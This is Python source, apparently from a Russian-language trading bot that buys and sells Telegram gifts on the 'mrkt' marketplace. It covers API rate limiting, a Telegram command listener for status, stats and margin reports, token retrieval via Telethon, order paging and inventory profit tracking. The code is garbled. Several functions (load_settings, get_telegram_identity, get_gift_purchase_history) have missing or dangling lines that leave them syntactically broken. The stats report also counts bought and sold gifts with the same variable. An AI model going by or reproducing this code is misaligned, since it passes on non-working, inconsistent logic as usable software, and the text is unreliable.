def load_api_config(path=API_FILE):
    try:
        with open(path, encoding="utf-8") as f:
            line = f.readline().strip()
    except FileNotFoundError:
        print(f"[api] Не найден {path}. Создай его рядом со скриптом.")
        print("      Формат одной строки: API_ID|API_HASH")
        sys.exit(1)
    if not line:
        print(f"[api] Файл {path} пустой.")
        sys.exit(1)
    parts = [p.strip() for p in line.split("|")]
    if len(parts) != 2:
        print(f"[api] {path}: ожидается формат API_ID|API_HASH")
        sys.exit(1)
    api_id_str, api_hash = parts
    if not api_id_str.isdigit() or not api_hash:
        print(f"[api] {path}: неверный формат")
        sys.exit(1)
    return int(api_id_str), api_hash

def _grad(text, c1, c2, bold=True):
    if not text:
        return text
    n = max(len(text) - 1, 1)
    out = []
    for i, ch in enumerate(text):
        r = c1[0] + (c2[0] - c1[0]) * i // n
        g = c1[1] + (c2[1] - c1[1]) * i // n
        b = c1[2] + (c2[2] - c1[2]) * i // n
        out.append(f"\033[38;2;{r};{g};{b}m{ch}")
    prefix = "\033[1m" if bold else ""
    return prefix + "".join(out) + _RESET

def load_settings():

    merged = dict(DEFAULT_SETTINGS)

        else:
            merged[key] = value

        default_scan["Difference"] = data["diff_threshold"]
    if "auto_scan_range" in data:
        default_scan["Range"] = data["auto_scan_range"]
    merged["AutoScan"] = default_scan
    if "Telegram" in data:
        merged["Telegram"] = data["Telegram"]
    return merged


def _atomic_write_json(path, data, **dump_kwargs):
    tmp_path = f"{path}.tmp{os.getpid()}"
    with open(tmp_path, "w", encoding="utf-8") as f:
        json.dump(data, f, **dump_kwargs)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp_path, path)

def load_proxy(path=PROXY_FILE):
    try:
        with open(path, encoding="utf-8") as f:
            line = f.readline().strip()
    except FileNotFoundError:
        return None
    if not line:
        return None
    parts = [p.strip() for p in line.split("|")]
    if len(parts) != 4:
        raise ValueError(f"proxy.txt: ожидается 4 поля")
    ip, proto_port, login, password = parts
    if ":" not in proto_port:
        raise ValueError(f"proxy.txt: не найден порт")
    proto, port = (x.strip() for x in proto_port.split(":", 1))
    return {"proto": proto.upper(), "ip": ip, "port": int(port), "login": login, "password": password}


def build_requests_proxies(proxy):
    if not proxy:
        return None
    scheme = {"SOCKS5": "socks5h", "SOCKS4": "socks4", "HTTP": "http", "HTTPS": "https"}.get(proxy["proto"], "socks5h")
    url = f"{scheme}://{proxy['login']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
    return {"http": url, "https": url}


def build_telethon_proxy(proxy):
    if not proxy:
        return None
    import socks
    kind = {"SOCKS5": socks.SOCKS5, "SOCKS4": socks.SOCKS4, "HTTP": socks.HTTP}.get(proxy["proto"], socks.SOCKS5)
    if proxy.get("login") and proxy.get("password"):
        return (kind, proxy["ip"], proxy["port"], proxy["login"], proxy["password"])
    return (kind, proxy["ip"], proxy["port"])

# Process-wide request pacing. The API returned HTTP 429 with Retry-After: 1,
# so concurrent workers must share one cooldown instead of retrying independently.
_API_MIN_INTERVAL = 0.25
_api_rate_lock = threading.Lock()
_api_next_request_at = 0.0
_api_blocked_until = 0.0


def _api_before_request():
    global _api_next_request_at
    with _api_rate_lock:
        now = time.monotonic()
        wait_for = max(_api_next_request_at - now, _api_blocked_until - now, 0.0)
        if wait_for > 0:
            time.sleep(wait_for)
        _api_next_request_at = time.monotonic() + _API_MIN_INTERVAL


def _api_note_response(response, request_id, path):
    global _api_blocked_until
    if response.status_code == 429:
        raw_retry = response.headers.get("Retry-After", "1")
        try:
            retry_after = max(1.0, min(float(raw_retry), 60.0))
        except (TypeError, ValueError):
            retry_after = 1.0
        with _api_rate_lock:
            _api_blocked_until = max(_api_blocked_until, time.monotonic() + retry_after)
        log_error(f"API rate limit: {path} HTTP 429; пауза {retry_after:g}s; request_id={request_id}")

API_COOLDOWN_MAX_SECONDS = 20.0

_api_cooldown_lock = threading.Lock()
_api_cooldown_until = 0.0


def _api_cooldown_for_code(code):
    if code in (429, 500, 502, 503, 504):
        return API_COOLDOWN_MAX_SECONDS
    if code in (400, 401, 403, 404):
        return API_COOLDOWN_SECONDS
    return 10.0


def trigger_api_cooldown(reason, code=None):
    global _api_cooldown_until
    seconds = _api_cooldown_for_code(code) if code is not None else API_COOLDOWN_SECONDS
    with _api_cooldown_lock:
        _api_cooldown_until = max(_api_cooldown_until, time.monotonic() + seconds)
    log_info(f"[API COOLDOWN] {reason} ({seconds:.0f}s)")
    time.sleep(min(1.0, seconds / 3.0))


def wait_for_api_cooldown():
    global _api_cooldown_until
    while True:
        with _api_cooldown_lock:
            until = _api_cooldown_until
            now = time.monotonic()
        if now >= until:
            return
        sleep_for = max(0.2, until - now)
        time.sleep(sleep_for)

def _telegram_chat_id():
    config = _telegram_config()
    if config["enabled"] and config["chat_id"]:
        return str(config["chat_id"])
    configured = os.environ.get(TELEGRAM_CHAT_ID_ENV, "").strip()
    if configured:
        return configured
    saved = _telegram_chat_id_from_file()
    if saved:
        return saved
    with _telegram_updates_lock:
        updates = _telegram_api("getUpdates", {"limit": 100, "allowed_updates": ["message", "channel_post"]})
    if not isinstance(updates, list):
        return None
    for update in reversed(updates):
        message = update.get("message") or update.get("channel_post") or {}
        chat = message.get("chat") if isinstance(message, dict) else None
        chat_id = chat.get("id") if isinstance(chat, dict) else None
        if chat_id is not None:
            try:
                settings = load_settings()

                    settings["Telegram"] = {}
                settings["Telegram"]["chat_id"] = str(chat_id)
                settings["Telegram"]["enabled"] = True
                save_settings(settings)
            except Exception:
                pass
            return str(chat_id)
    return None

def _telegram_api(method, payload=None, request_timeout=10, retries=5, retry_backoff=1.0):
    token = _telegram_token()
    if not token:
        return None
    last_reason = None
    delay = retry_backoff
    for attempt in range(retries + 1):
        try:
            response = _session.post(
                f"{TELEGRAM_API_URL}/bot{token}/{method}",
                json=payload or {},
                timeout=request_timeout,
            )
            data = response.json() if response.text else {}
            if response.status_code == 200 and data.get("ok", False):
                return data.get("result")
            if response.status_code == 429:
                retry_after = data.get("parameters", {}).get("retry_after", 5)
                log_error(f"Telegram API [{method}]: 429, ждём {retry_after}с")
                time.sleep(retry_after)
                continue
            last_reason = f"HTTP {response.status_code}: {str(data)[:200]}"
        except (requests.RequestException, ValueError) as e:
            last_reason = str(e)
        if attempt < retries:
            time.sleep(delay * (2 ** attempt))
    if last_reason:
        log_error(f"Telegram API [{method}]: неудача после {retries + 1} попыток: {last_reason}")
    return None

def _get_collection_floor_cached(token, collection):
    key = ("collection", str(collection)); now = time.time()
    with _floor_cache_lock:
        cached = _floor_cache.get(key)
        if cached and now - cached[0] < FLOOR_CACHE_TTL: return cached[1]
    value = None
    for attempt in range(3):
        data = api_get(token, "/gifts/collections")
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and str(item.get("name") or item.get("collectionName")) == str(collection):
                    value = _floor_value_nano(item.get("floorPriceNanoTons")); break
        if value is not None: break
        if attempt < 2: time.sleep(0.25 * (attempt + 1))
    if value is not None:
        with _floor_cache_lock: _floor_cache[key] = (time.time(), value)
    return value


def _get_model_floor_cached(token, collection, model):

    key = ("model", str(collection), str(model)); now = time.time()
    with _floor_cache_lock:
        cached = _floor_cache.get(key)
        if cached and now - cached[0] < FLOOR_CACHE_TTL: return cached[1]
    value = None
    for attempt in range(3):
        code, resp = api_post(token, "/gifts/models", {"collections": [collection]})
        if code in (200, 201) and isinstance(resp, list):
            for item in resp:
                if isinstance(item, dict) and str(item.get("collectionName")) == str(collection) and str(item.get("modelName")) == str(model):
                    value = _floor_value_nano(item.get("floorPriceNanoTons")); break
        if value is not None: break
        if attempt < 2: time.sleep(0.25 * (attempt + 1))
    if value is not None:
        with _floor_cache_lock: _floor_cache[key] = (time.time(), value)
    return value

def _inventory_event_datetime(value):
    """Разбирает время события из inventory.json в UTC."""
    if not value:
        return None
    if isinstance(value, (int, float)):
        try:
            return datetime.fromtimestamp(value, tz=timezone.utc)
        except (OverflowError, OSError, ValueError):
            return None
    if not isinstance(value, str):
        return None
    return _parse_api_iso(value)


def _telegram_stats_text(inventory=None):
    if inventory is None:
        inventory = load_inventory()

    purchases = [p for p in inventory.get("purchases", []) if isinstance(p, dict)]
    sales = [s for s in inventory.get("sales", []) if isinstance(s, dict)]

    def event_time(item, is_sale=False):
        keys = ("sold_at", "date", "created_at") if is_sale else ("date", "bought_at", "created_at")
        for key in keys:
            parsed = _inventory_event_datetime(item.get(key))
            if parsed:
                return parsed
        return None

    purchase_by_history_key = {
        str(p.get("history_key")): p for p in purchases if p.get("history_key")
    }
    matched_purchase_ids = set()
    matched_pairs = []
    unmatched_sales = []
    for sale in sorted(sales, key=lambda x: event_time(x, True) or datetime.min.replace(tzinfo=timezone.utc)):
        purchase_key = sale.get("purchase_history_key")
        purchase = purchase_by_history_key.get(str(purchase_key)) if purchase_key else None
        if purchase is not None and id(purchase) not in matched_purchase_ids:
            matched_purchase_ids.add(id(purchase))
            matched_pairs.append((purchase, sale))
        else:
            unmatched_sales.append(sale)

    for sale in unmatched_sales:
        gid = sale.get("gift_id")
        if gid is None:
            continue
        candidates = [
            p for p in purchases
            if p.get("gift_id") == gid and id(p) not in matched_purchase_ids
            and (event_time(p) is None or event_time(sale, True) is None or event_time(p) <= event_time(sale, True))
        ]
        if candidates:
            purchase = min(candidates, key=lambda p: event_time(p) or datetime.min.replace(tzinfo=timezone.utc))
            matched_purchase_ids.add(id(purchase))
            matched_pairs.append((purchase, sale))

    unmatched_purchases = [p for p in purchases if id(p) not in matched_purchase_ids]
    cutoff = datetime.now(timezone.utc) - timedelta(hours=24)
    recent_purchases = [p for p in purchases if event_time(p) and event_time(p) >= cutoff]
    recent_sales = [s for s in sales if event_time(s, True) and event_time(s, True) >= cutoff]
    recent_pairs_by_sale = [(p, s) for p, s in matched_pairs if event_time(s, True) and event_time(s, True) >= cutoff]

    def amount(item):
        try:
            return int(item.get("price_nano") or 0)
        except (TypeError, ValueError):
            return 0

    bought_volume = sum(amount(p) for p in purchases)
    matched_cost = sum(amount(p) for p, _ in matched_pairs)
    matched_revenue = sum(amount(s) for _, s in matched_pairs)
    open_count = len(unmatched_purchases)

    bought_volume_24h = sum(amount(p) for p in recent_purchases)
    recent_cost = sum(amount(p) for p, _ in recent_pairs_by_sale)
    recent_revenue = sum(amount(s) for _, s in recent_pairs_by_sale)
    recent_open_count = sum(1 for p in recent_purchases if id(p) not in matched_purchase_ids)

    return (
        "💸 <b>СТАТИСТИКА</b>\n"
        f"├ Откуплено на: <b>{_telegram_ton(bought_volume)} GRAM</b>\n"
        f"├ Затрачено: <b>{_telegram_ton(matched_cost)} GRAM</b>\n"
        f"├ Получено: <b>{_telegram_ton(matched_revenue)} GRAM</b>\n"
        f"├ Профит: <b>{_telegram_ton(matched_revenue - matched_cost)} GRAM</b>\n"
        f"├ Не продано: <b>{open_count}</b>\n"
        f"├ Куплено подарков: <b>{len(matched_pairs)}</b>\n"
        f"└ Продано подарков: <b>{len(matched_pairs)}</b>\n"
        "\n"
        "🕒 <b>ЗА ПОСЛЕДНИЕ 24 ЧАСА</b>\n"
        f"├ Откуплено на: <b>{_telegram_ton(bought_volume_24h)} GRAM</b>\n"
        f"├ Затрачено: <b>{_telegram_ton(recent_cost)} GRAM</b>\n"
        f"├ Получено: <b>{_telegram_ton(recent_revenue)} GRAM</b>\n"
        f"├ Профит: <b>{_telegram_ton(recent_revenue - recent_cost)} GRAM</b>\n"
        f"├ Не продано: <b>{recent_open_count}</b>\n"
        f"├ Куплено подарков: <b>{len(recent_pairs_by_sale)}</b>\n"
        f"└ Продано подарков: <b>{len(recent_pairs_by_sale)}</b>"
    )

def _telegram_margin_text(token):
    """Считает реализованную маржу по истории buy/sell.

    Продажа сопоставляется с ближайшей неиспользованной покупкой того же gift_id.
    Это важно: простая сумма всех sell минус всех buy искажает результат,
    если часть подарков ещё не продана или один подарок продавался несколько раз.
    """
    entries = get_gift_purchase_history(token, limit=100)
    events = []
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        typ = str(entry.get("type", "")).lower()
        if typ not in ("buy", "sell"):
            continue
        price = entry.get("price")
        try:
            price = int(price)
        except (TypeError, ValueError):
            continue
        gift = entry.get("gift") if isinstance(entry.get("gift"), dict) else {}
        gift_id = gift.get("id") or entry.get("giftId") or entry.get("nftId") or entry.get("itemId")
        if gift_id is None:
            continue
        date = entry.get("date") or entry.get("createdAt") or entry.get("created_at") or ""
        events.append({"type": typ, "price": price, "gift_id": str(gift_id), "date": date, "id": entry.get("id")})

    events.sort(key=lambda x: (_parse_api_iso(x["date"]) or datetime.min.replace(tzinfo=timezone.utc), x["type"]))
    buy_queues = {}
    matched_sales = 0
    revenue = 0
    cost = 0
    profit = 0
    unmatched_sales = 0

    for event in events:
        gid = event["gift_id"]
        if event["type"] == "buy":
            buy_queues.setdefault(gid, []).append(event)
            continue
        revenue += event["price"]
        queue = buy_queues.get(gid) or []
        if queue:
            buy = queue.pop(0)
            cost += buy["price"]
            profit += event["price"] - buy["price"]
            matched_sales += 1
        else:
            unmatched_sales += 1

    margin_pct = (profit / cost * 100.0) if cost else 0.0
    return (
        "📈 <b>ALL-TIME MARGIN</b>\n"
        f"Продано: <b>{matched_sales + unmatched_sales}</b>\n"
        f"Выручка: <b>{_telegram_ton(revenue)} GRAM</b>\n"
        f"Себестоимость проданных: <b>{_telegram_ton(cost)} GRAM</b>\n"
        f"Маржа: <b>{_telegram_ton(profit)} GRAM</b>\n"
        f"Margin: <b>{margin_pct:.2f}%</b>"
        + (f"\n⚠ Без пары покупки: <b>{unmatched_sales}</b>" if unmatched_sales else "")
    )


def _telegram_command_loop(stop_event):
    if not _telegram_enabled():
        return
    target_chat_id = _telegram_chat_id()
    offset = None
    while not stop_event.is_set():
        payload = {"limit": 100, "timeout": 5, "allowed_updates": ["message", "channel_post"]}
        if offset is not None:
            payload["offset"] = offset
        try:
            with _telegram_updates_lock:
                updates = _telegram_api("getUpdates", payload, request_timeout=10, retries=0)
        except Exception as e:
            log_error(f"Telegram command listener: {e}", detail=traceback.format_exc())
            stop_event.wait(2)
            continue
        if updates is None:
            stop_event.wait(2)
            continue
        if not isinstance(updates, list):
            stop_event.wait(2)
            continue
        for update in updates:
            update_id = update.get("update_id")
            if isinstance(update_id, int):
                offset = update_id + 1
            message = update.get("message") or update.get("channel_post") or {}
            if not isinstance(message, dict):
                continue
            chat = message.get("chat") or {}
            chat_id = chat.get("id")
            text = message.get("text")
            if chat_id is None or not isinstance(text, str):
                continue
            if target_chat_id is None:
                target_chat_id = str(chat_id)
                try:
                    settings = load_settings()
                    if "Telegram" not in settings:
                        settings["Telegram"] = {}
                    settings["Telegram"]["chat_id"] = str(chat_id)
                    settings["Telegram"]["enabled"] = True
                    save_settings(settings)
                except Exception:
                    pass
            if str(chat_id) != str(target_chat_id):
                continue
            command = text.strip().split(maxsplit=1)[0].lower()
            command = command.split("@", 1)[0]
            if command == "/status":
                _telegram_send_to_chat(_telegram_status_text(), target_chat_id)
            elif command == "/stats":
                try:
                    _telegram_send_to_chat(_telegram_stats_text(load_inventory()), target_chat_id)
                except Exception as e:
                    log_error(f"Telegram /stats: {e}", detail=traceback.format_exc())
                    _telegram_send_to_chat("❌ Ошибка чтения статистики из inventory.json.", target_chat_id)
            elif command == "/margin":
                try:
                    token = _active_token or _telegram_token()
                    if not token:
                        _telegram_send_to_chat("❌ Не удалось получить token для расчёта маржи.", target_chat_id)
                        continue
                    _telegram_send_to_chat("⏳ <b>Считаю маржу по истории buy/sell...</b>", target_chat_id)
                    result = _telegram_margin_text(token)
                    _telegram_send_to_chat(result, target_chat_id)
                except Exception as e:
                    log_error(f"Telegram /margin: {e}", detail=traceback.format_exc())
                    _telegram_send_to_chat("❌ Ошибка расчёта маржи. Подробность записана в лог.", target_chat_id)
            elif command == "/restart":
                _telegram_restart_event.set()
                _telegram_send_to_chat(
                    "🔄 <b>ПЕРЕЗАГРУЗКА</b>\n"
                    "├─ Перезапуск торгового цикла\n"
                    "├─ Обновление пула\n"
                    "└─ Отмена ордеров",
                    target_chat_id,
                )
        if not updates:
            stop_event.wait(0.2)


def _start_telegram_command_listener():
    global _telegram_command_stop_event, _telegram_command_thread
    if not _telegram_enabled():
        return
    if _telegram_command_thread and _telegram_command_thread.is_alive():
        return
    _telegram_command_stop_event = threading.Event()
    _telegram_command_thread = threading.Thread(
        target=_telegram_command_loop,
        args=(_telegram_command_stop_event,),
        name="telegram-command-listener",
        daemon=True,
    )
    _telegram_command_thread.start()


def _stop_telegram_command_listener():
    global _telegram_command_stop_event, _telegram_command_thread
    if _telegram_command_stop_event:
        _telegram_command_stop_event.set()
    if (_telegram_command_thread and _telegram_command_thread.is_alive()
            and _telegram_command_thread is not threading.current_thread()):
        _telegram_command_thread.join(timeout=1.5)
    _telegram_command_stop_event = None
    _telegram_command_thread = None


def _hdr(token):
    return {
        "Content-Type": "application/json",
        "Referer": "https://cdn.tgmrkt.io/",
        "Origin": "https://cdn.tgmrkt.io",
        "User-Agent": UA,
        "Authorization": token,
        "Cookie": f"access_token={token}",
    }


def api_get(token, path):
    request_id = uuid.uuid4().hex[:10]
    try:
        wait_for_api_cooldown()
        _api_before_request()
        r = _session.get(BASE_URL + path, headers=_hdr(token), timeout=10)
        _api_note_response(r, request_id, path)
        if r.status_code == 200:
            try:
                return r.json() if r.text else {}
            except ValueError:
                log_error(f"api_get {path}: не-JSON ответ; request_id={request_id}")
                return None

        if r.status_code in (400, 401, 403, 404, 429, 500, 502, 503, 504):
            trigger_api_cooldown(f"api_get {path}", r.status_code)
        if r.status_code != 429:
            log_error(f"api_get {path}: HTTP {r.status_code}; request_id={request_id}; body={(r.text or '')[:250]}")
        return None
    except (requests.exceptions.RequestException, ValueError) as e:
        trigger_api_cooldown(f"api_get {path} network error", 500)
        log_error(f"api_get {path}: сетевая ошибка: {e}; request_id={request_id}")
        return None


def api_post(token, path, data):
    request_id = uuid.uuid4().hex[:10]
    safe_to_retry = path in ("/orders", "/orders/get-my-orders")
    max_attempts = 3 if safe_to_retry else 1

    for attempt in range(max_attempts):
        try:
            wait_for_api_cooldown()
            _api_before_request()
            r = _session.post(BASE_URL + path, json=data, headers=_hdr(token), timeout=10)
            _api_note_response(r, request_id, path)
            try:
                body = r.json() if r.text else {}
            except ValueError:
                raw = (r.text or "").strip()
                if r.status_code >= 500 and ("<html" in raw.lower() or "cloudflare" in raw.lower()):
                    body = f"upstream HTTP {r.status_code} (gateway/server error; response HTML omitted)"
                else:
                    body = raw[:300]

            if r.status_code == 429 and safe_to_retry and attempt + 1 < max_attempts:
                trigger_api_cooldown(f"429 retry {path}", 429)
                continue

            if r.status_code in (400, 401, 403, 404, 429, 500, 502, 503, 504):
                trigger_api_cooldown(f"api_post {path}", r.status_code)

            if r.status_code >= 400 and r.status_code != 429:
                diagnostic_payload = data if path == "/orders/create" and isinstance(data, dict) else None
                suffix = f"; payload={diagnostic_payload}" if diagnostic_payload is not None else ""
                if path == "/orders/create":
                    header_names = (
                        "Content-Type", "Date", "Server", "Retry-After",
                        "X-Request-ID", "Request-Id", "Traceparent", "X-Correlation-ID",
                    )
                    response_headers = {
                        name: r.headers.get(name) for name in header_names
                        if r.headers.get(name) is not None
                    }
                    suffix += f"; response_headers={response_headers}"
                log_error(f"api_post {path}: HTTP {r.status_code}; request_id={request_id}; body={str(body)[:500]}{suffix}")

            return r.status_code, body

        except requests.exceptions.RequestException as e:
            trigger_api_cooldown(f"api_post {path} network error", 500)
            log_error(f"api_post {path}: сетевая ошибка: {type(e).__name__}: {e}; request_id={request_id}")
            return 0, f"network error: {type(e).__name__}: {e}"

    return 429, {"error": "rate_limited", "request_id": request_id}


async def get_fresh_token():
    """Получает mrkt-токен для аккаунта клиента (использует CLIENT_SESSION)."""
    telethon_proxy = build_telethon_proxy(PROXY)
    client = TelegramClient(CLIENT_SESSION, API_ID, API_HASH, proxy=telethon_proxy)
    await client.start()
    try:
        bot = await client.get_entity("mrkt")
        result = await client(RequestWebViewRequest(
            peer=bot, bot=bot, platform="android",
            url="https://cdn.tgmrkt.io/twa/index.html",
        ))
        init_data = unquote(result.url.split("tgWebAppData=", 1)[1].split("&tgWebAppVersion", 1)[0])
        code, resp = api_post("", "/auth", {"data": init_data})
        if isinstance(resp, dict) and resp.get("token"):
            token = resp["token"]
            with open("mrkt_token.txt", "w") as f:
                f.write(token)
            return token
        raise RuntimeError(f"Auth failed (HTTP {code}): {resp}")
    finally:
        await client.disconnect()

async def get_telegram_identity():

def _order_matches_scope(order, collection_name, backdrop_name=None):
    """Reject cross-collection/backdrop results before price comparison."""
    if not isinstance(order, dict):
        return False
    returned_collection = order.get("collectionName")
    if returned_collection != collection_name:
        return False
    if order.get("backdropName") != backdrop_name:
        return False
    return True

def get_gift_purchase_history(token, limit=100, from_date=None):

        resp = api_get(token, f"/history?{params}")

        log_error(f"history: ошибка запроса: {e}", detail=traceback.format_exc())
        return []

            if isinstance(value, list):
                return value
    return []


def _nested_value(obj, *paths):
    for path in paths:
        cur = obj
        ok = True
        for key in path:
            if not isinstance(cur, dict) or key not in cur:
                ok = False
                break
            cur = cur[key]
        if ok and cur not in (None, ""):
            return cur
    return None


def _history_purchase_details(entry):
    gift = entry.get("gift") if isinstance(entry, dict) else None
    if not isinstance(gift, dict):
        gift = {}
    event_type = str(entry.get("type", "buy")).lower()
    price = entry.get("price")
    if price is None:
        price = entry.get("priceNano") or entry.get("price_nano")
    try:
        price = int(price)
    except (TypeError, ValueError):
        price = 0
    collection = _nested_value(
        gift, ("collectionName",), ("collectionTitle",), ("collection", "name"),
        ("collection", "title"), ("collection",), ("giftCollectionName",),
    ) or _nested_value(entry, ("collectionName",), ("collectionTitle",), ("collection", "name"), ("collection", "title"))
    model = _nested_value(gift, ("modelName",), ("modelTitle",), ("model", "name"), ("model", "title")) or _nested_value(entry, ("modelName",), ("modelTitle",), ("model", "name"))
    backdrop = _nested_value(gift, ("backdropName",), ("backdropTitle",), ("backdrop", "name"), ("backdrop", "title")) or _nested_value(entry, ("backdropName",), ("backdropTitle",), ("backdrop", "name"))
    gift_id = _nested_value(gift, ("id",), ("receivedGiftId",), ("giftId",))
    if gift_id is None:
        gift_id = _nested_value(entry, ("giftId",), ("nftId",), ("itemId",))
    gift_id = str(gift_id) if gift_id is not None else None
    history_id = _nested_value(entry, ("id",), ("transactionId",), ("transaction_id",), ("hash",))
    date = entry.get("date") or entry.get("createdAt") or entry.get("created_at") or ""
    event_identity = str(history_id) if history_id else f"{gift_id or 'unknown'}:{date}:{price}"
    key = f"{event_type}:{event_identity}"
    return {
        "history_key": key, "type": event_type,
        "collection": str(collection) if collection is not None else None,
        "model": str(model) if model is not None else None,
        "backdrop": str(backdrop) if backdrop is not None else None,
        "price_nano": price, "gift_id": gift_id, "gift": gift or None, "date": date,
    }


def sync_purchase_history(token, inventory):
    """Синхронизирует покупки и продажи из единственного источника истины — /history."""
    new_purchases = []
    if _telegram_enabled():
        for pending_sale in inventory.get("sales", []):
            if not pending_sale.get("telegram_notified"):
                if _telegram_notify_sale(pending_sale, inventory):
                    pending_sale["telegram_notified"] = True
                    save_inventory(inventory)

    entries = get_gift_purchase_history(token, limit=100)
    events = [e for e in entries if isinstance(e, dict) and str(e.get("type", "")).lower() in ("buy", "sell")]
    events.sort(key=lambda e: _parse_api_iso(e.get("date") or e.get("createdAt") or "") or datetime.min.replace(tzinfo=timezone.utc))

    for entry in events:
        details = _history_purchase_details(entry)
        key = details["history_key"]
        with _inventory_lock:
            if key in inventory.get("_processed_history_set", set()):
                continue

        if details["price_nano"] <= 0 or not details["gift_id"] or not details["collection"]:
            continue

        if details["type"] == "buy":
            purchase = {
                "order_id": f"history:{key}", "history_key": key,
                "gift_id": details["gift_id"], "collection": details["collection"],
                "model": details["model"], "backdrop": details["backdrop"],
                "price_nano": details["price_nano"], "gift": details["gift"], "date": details["date"],
            }
            if not details["model"] or not details["backdrop"]:
                log_info(f"BUYED пропущен: неполные атрибуты подарка ({details['collection']})")
                continue
            floors = _get_purchase_floors(token, purchase)
            if not all(_floor_value_nano(v) is not None for v in floors):
                log_info(f"BUYED пропущен: один из floor = N/A ({details['collection']} / {details['backdrop']} / {details['model']})")
                continue
            purchase["_floors"] = floors
            inserted = record_purchase(
                inventory, purchase["order_id"], details["collection"], details["backdrop"],
                details["price_nano"], details["gift_id"], details["model"], key,
                bought_at=details["date"] or None
            )
            if inserted:
                new_purchases.append(purchase)
                log_buyed(label(details["collection"], details["backdrop"]), details["price_nano"])
            else:
                existing = next((p for p in reversed(inventory.get("purchases", [])) if p.get("gift_id") == details["gift_id"]), {})
                purchase["order_id"] = existing.get("order_id") or purchase["order_id"]

            telegram_ok = _telegram_notify_purchase_safe(token, purchase, inventory)
            if telegram_ok or not _telegram_enabled():
                with _inventory_lock:
                    inventory.setdefault("_processed_history_set", set()).add(key)
                    save_inventory(inventory)
        else:
            sale = {
                "history_key": key, "gift_id": details["gift_id"],
                "collection": details["collection"], "model": details["model"],
                "backdrop": details["backdrop"], "price_nano": details["price_nano"],
                "gift": details["gift"], "sold_at": details["date"],
            }
            with _inventory_lock:
                if any(x.get("history_key") == key for x in inventory.get("sales", [])):
                    inventory.setdefault("_processed_history_set", set()).add(key)
                    save_inventory(inventory)
                    continue
                matched = None
                for saved_purchase in reversed(inventory.get("purchases", [])):
                    if saved_purchase.get("gift_id") == details["gift_id"] and not saved_purchase.get("sold"):
                        matched = saved_purchase
                        break
                if matched:
                    sale["buy_price_nano"] = int(matched.get("price_nano") or 0)
                    sale["purchase_history_key"] = matched.get("history_key")
                    matched["sold"] = True
                    matched["sold_history_key"] = key
                inventory.setdefault("sales", []).append(sale)
                stats = inventory.setdefault("stats", {})
                stats["sold_count"] = int(stats.get("sold_count", 0) or 0) + 1
                stats["revenue_nano"] = int(stats.get("revenue_nano", 0) or 0) + details["price_nano"]
                stats["profit_nano"] = int(stats.get("revenue_nano", 0) or 0) - int(stats.get("spent_nano", 0) or 0)
                inventory.setdefault("_processed_history_set", set()).add(key)
                save_inventory(inventory)
            if _telegram_notify_sale(sale, inventory):
                sale["telegram_notified"] = True
                save_inventory(inventory)
    return new_purchases


def get_my_orders(token, collection_name, backdrop_name=None):
    cursor = ""
    all_orders = []
    seen_ids = set()
    max_pages = 30
    for page_index in range(max_pages):
        code, resp = api_post(token, "/orders/get-my-orders", {
            "availableForStaking": None,
            "backdropNames": [backdrop_name] if backdrop_name else [],
            "collectionNames": [collection_name],
            "count": 100, "cursor": cursor, "lowToHigh": False,
            "maxPrice": None, "minPrice": None, "modelNames": [],
            "ordering": "PublicationTime", "query": None, "symbolNames": [],
        })
        if code != 200:
            return None
        if isinstance(resp, dict) and isinstance(resp.get("orders"), list):
            candidates = resp["orders"]
            next_cursor = resp.get("cursor") or resp.get("nextCursor") or ""
        elif isinstance(resp, list):
            candidates = resp
            next_cursor = ""
        else:
            log_error(f"/orders/get-my-orders: неожиданный формат ответа для {collection_name}/{backdrop_name!r}")
            return None

        new_count = 0
        for order in candidates:
            if not _order_matches_scope(order, collection_name, backdrop_name):
                continue
            order_id = order.get("id")
            if order_id:
                order_id = str(order_id)
                if order_id in seen_ids:
                    continue
                seen_ids.add(order_id)
            all_orders.append(order)
            new_count += 1

        if not candidates or not next_cursor or next_cursor == cursor:
            return all_orders
        if new_count == 0 and next_cursor in (cursor, ""):
            return all_orders
        cursor = next_cursor

    log_error(
        f"/orders/get-my-orders: достигнут лимит страниц ({max_pages}) для "
        f"{collection_name}/{backdrop_name!r}; проверка ордеров неполная, создание заблокировано"
    )
    return None


def _parse_api_iso(ts):
    if not ts or not isinstance(ts, str):
        return None
    try:
        normalized = ts.replace("Z", "+00:00")
        dt = datetime.fromisoformat(normalized)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except ValueError:
        return None


def classify_order(order):
    total = order.get("totalQuantity", 1) or 0
    done = order.get("completedQuantity", 0) or 0
    if total > 0 and done >= total:
        return "executed"
    finished_at = _parse_api_iso(order.get("finishedAt"))
    if finished_at is not None and finished_at <= datetime.now(timezone.utc):
        return "cancelled"
    return "active"


def split_my_orders(token, collection_name, backdrop_name=None):
    all_orders = get_my_orders(token, collection_name, backdrop_name)
    if all_orders is None:
        return None, None
    active, completed = [], []
    for o in all_orders:
        state = classify_order(o)
        if state == "executed":
            completed.append(o)
        elif state == "active":
            active.append(o)
    return active, completed

def save_inventory(inv):
    to_write = {k: v for k, v in inv.items() if k not in ("_processed_set", "_processed_history_set", "_notified_set")}
    to_write["processed_order_ids"] = list(inv["_processed_set"])
    to_write["processed_history_keys"] = list(inv.get("_processed_history_set", set()))
    to_write["notified_order_ids"] = list(inv["_notified_set"])
    _atomic_write_json(INVENTORY_FILE, to_write, indent=2, ensure_ascii=False)


def record_purchase(inv, order_id, collection, backdrop, price_nano, gift_id=None, model=None, history_key=None, bought_at=None):
    with _inventory_lock:
        if order_id and order_id in inv["_processed_set"]: return False
        if gift_id and any(p.get("gift_id") == gift_id and not p.get("sold") for p in inv.get("purchases", [])): return False
        if history_key and history_key in inv.get("_processed_history_set", set()): return False
        if order_id: inv["_processed_set"].add(order_id)
        purchase_time = bought_at or datetime.now(timezone.utc).isoformat()
        inv["purchases"].append({"order_id": order_id, "gift_id": gift_id, "collection": collection, "backdrop": backdrop, "model": model, "price_nano": price_nano, "bought_at": purchase_time, "history_key": history_key})
        inv["stats"]["bought_count"] += 1; inv["stats"]["spent_nano"] += price_nano
        inv["stats"]["profit_nano"] = inv["stats"]["revenue_nano"] - inv["stats"]["spent_nano"]
        save_inventory(inv); return True

def _filter_lines_by_settings(lines, min_price, max_price, diff_threshold, allowed_backdrops, balance_ton=None):
    settings_filtered = []
    balance_filtered = []
